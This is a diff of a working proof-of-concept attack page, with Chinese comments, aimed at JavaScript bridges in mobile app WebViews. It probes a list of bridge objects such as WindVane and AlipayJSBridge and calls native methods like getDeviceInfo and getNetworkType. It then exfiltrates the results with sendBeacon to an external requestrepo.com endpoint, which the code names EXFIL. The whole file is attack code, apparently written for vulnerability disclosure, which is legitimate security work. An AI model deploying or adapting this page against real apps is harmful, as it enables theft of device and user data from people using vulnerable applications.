@@ -3,23 +3,28 @@
 <body style="background:#fff;color:#000;font:16px monospace;padding:8px">
 <pre id="o" style="white-space:pre-wrap;word-break:break-all;font-size:15px">running…</pre>
 <script>
-var EXFIL = "https://enio2ns.requestrepo.com/requests"; // 外带地址(占位,可改)
-var out = {href:location.href, origin:location.origin, bridges:[], windvane:[], err:null};
+var EXFIL="https://enio2ns.requestrepo.com/requests";
+var out={href:location.href,origin:location.origin,bridges:[],calls:[],err:null};
 function methodsOf(b){var s={},a=[],o=b;for(var d=0;d<5&&o;d++){try{Object.getOwnPropertyNames(o).forEach(function(p){if(!s[p]){s[p]=1;a.push(p);}});}catch(e){}o=Object.getPrototypeOf(o);}return a;}
-function show(){var s=JSON.stringify(out,null,1);document.getElementById('o').textContent=s;try{navigator.sendBeacon?navigator.sendBeacon(EXFIL,new Blob([s],{type:'text/plain'})):0;}catch(e){}}
+function show(){var s=JSON.stringify(out,null,1);document.getElementById('o').textContent=s;try{navigator.sendBeacon&&navigator.sendBeacon(EXFIL,new Blob([s],{type:'text/plain'}));}catch(e){}}
+function callBridge(fnName,cls,meth,param){
+  try{
+    var wv=window.__windvane__;
+    if(wv&&wv[fnName]){
+      wv[fnName](cls,meth,param||{},
+        function(r){out.calls.push(fnName+" "+cls+"."+meth+" OK:"+JSON.stringify(r).slice(0,500));show();},
+        function(e){out.calls.push(fnName+" "+cls+"."+meth+" ERR:"+JSON.stringify(e).slice(0,400));show();});
+    } else { out.calls.push(fnName+" 不存在"); }
+  }catch(e){out.calls.push(fnName+" EXC:"+e);}
+}
 try{
-  // 1) 枚举常见 JS 桥对象
-  var dict=["__windvane__","WindVane","windvane","WVJB","AlipayJSBridge","_DSBridge_","dsBridge","WebViewJavascriptBridge","android","Android","native","Native","app","App","client","Client","jsapi","JsApi","prompt","sdk","SDK","container","H5Container","uniInterface","kvInterface","jsInterface","HeytapNativeApi","JDJSCore","JDPaySdk","JDAppUnite"];
-  dict.forEach(function(n){try{if(window[n]){var m=methodsOf(window[n]);out.bridges.push({name:n,type:typeof window[n],methods:m.slice(0,50)});}}catch(e){}});
-  // 2) WindVane 只读调用（证明桥可从攻击页调起）
-  if(window.WindVane && window.WindVane.call){
-    out.windvane.push("WindVane.call available");
-    try{window.WindVane.call("WVBase","getDeviceInfo",{params:{}},function(r){out.windvane.push("getDeviceInfo OK:"+JSON.stringify(r).slice(0,300));show();},function(e){out.windvane.push("getDeviceInfo FAIL:"+JSON.stringify(e).slice(0,200));show();});}catch(e){out.windvane.push("getDeviceInfo exc:"+e);}
-    try{window.WindVane.call("BaseInfo","getBaseInfo",{},function(r){out.windvane.push("getBaseInfo OK:"+JSON.stringify(r).slice(0,300));show();},function(e){out.windvane.push("getBaseInfo FAIL:"+JSON.stringify(e).slice(0,200));show();});}catch(e){}
-  } else if(window.__windvane__){
-    out.windvane.push("__windvane__ present, call="+(typeof window.__windvane__.call));
-  }
+  var dict=["__windvane__","WindVane","windvane","AlipayJSBridge","_DSBridge_","android","native","app","client","jsapi","prompt","sdk","container"];
+  dict.forEach(function(n){try{if(window[n])out.bridges.push({name:n,type:typeof window[n],methods:methodsOf(window[n]).slice(0,40)});}catch(e){}});
+  // 只读方法实测：证明攻击页可任意调 native
+  callBridge("call","WVNative","getDeviceInfo",{});
+  callBridge("call","BaseInfo","getBaseInfo",{});
+  callBridge("call","WVNative","getNetworkType",{});
+  callBridge("nativeCall","WVNative","getDeviceInfo",{});
 }catch(e){out.err=String(e);}
-show();
-setTimeout(show,2500); // 等异步回调后再刷一次
+show();setTimeout(show,3000);
 </script></body>
